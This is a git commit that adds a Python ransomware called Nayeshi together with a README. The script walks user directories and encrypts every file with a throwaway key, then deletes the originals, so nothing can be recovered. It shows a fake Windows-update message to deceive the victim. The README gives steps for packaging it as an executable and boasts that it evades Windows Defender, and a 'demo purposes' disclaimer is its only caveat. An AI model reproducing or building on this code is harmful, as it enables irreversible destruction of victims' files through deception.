320ec535aa9e30b67ed506264025c578fff48086
Johannes Habel <EchterAlsFake@proton.me>
2023-09-17 15:49:33 +0200

    v1

---
+++ Nayeshi.py
@@ -0,0 +1,93 @@
+import threading
+import os
+
+from tqdm import tqdm
+from cryptography.fernet import Fernet
+
+target_path = [
+        "C:\\Users\\",
+        "",
+        "",
+    ]
+    # Define the target directories here
+    # Use \\ for Windows and / slash for Linux :)
+
+    # My personal recommendation would be:
+    # Windows: C:\\Users\\
+    # Linux  : /home/
+
+
+"""
+IMPORTANT INFORMATION:
+
+THIS FILE IS A RANSOMWARE. IT WILL DECRYPT ALL FILES IN THE SPECIFIED LOCATION WITHOUT ANY CHANCE OF
+RESTORING THEM. I AM NOT LIABLE FOR MISUSE OF THIS SCRIPT. IT IS INTENDED FOR DEMO PURPOSES!
+"""
+"""
+Copyright (C) 2023  EchterAlsFake | Johannes Habel
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.
+"""
+
+
+
+key = Fernet.generate_key()
+f = Fernet(key)
+
+
+def decrypt(filename):
+    try:
+        with open(filename, "rb") as file:
+            file_data = file.read()
+        encrypted_data = f.encrypt(file_data)
+
+        os.remove(filename)
+
+        with open(f"{filename}.nyi", "wb") as file:
+            file.write(encrypted_data)
+
+    except PermissionError:
+        pass
+        # You could make an additional function to prompt user to use root for this script
+
+    except FileNotFoundError:
+        pass
+
+
+def get_all_files(start_path):
+    print(start_path)
+    all_files = []
+    for path in start_path:
+        print(path)
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                # construct full file path
+                file_path = os.path.join(root, file)
+                all_files.append(file_path)
+
+    return all_files
+
+
+def execute():
+
+    files = get_all_files(target_path)
+    for file in tqdm(files):
+        decrypt(file)
+
+
+if __name__ == "__main__":
+    t1 = threading.Thread(target=execute)
+    t1.start()
+
+    print("Updating Windows to KB-2023-11-26.v231 Please do NOT close this window!")
--- README.md
+++ README.md
@@ -1,2 +1,27 @@
 # Nayeshi
-A Windows Ransomware developed to make damage without any use case
+
+#### A lightweight fast ransomware made with Python
+
+# Information - Disclaimer
+
+Usage of this script in environments you don't own or have no permission for
+<br>is illegal and can get you into jail!
+
+```
+Use it only for demo purposes and to teach people about the danger!
+```
+
+# Usage
+
+- Clone Repository: git clone https://github.com/EchterAlsFake/Nayeshi
+- Edit file Nayeshi.py 
+- Go to line 8
+- Add the directories into the quotation marks
+- pip install -r requirements.txt
+- pyinstaller -F Nayeshi.py
+- Now you have your executable. 
+
+# Windows Defender
+```
+Windows defender didn't detect it on Windows 11
+```
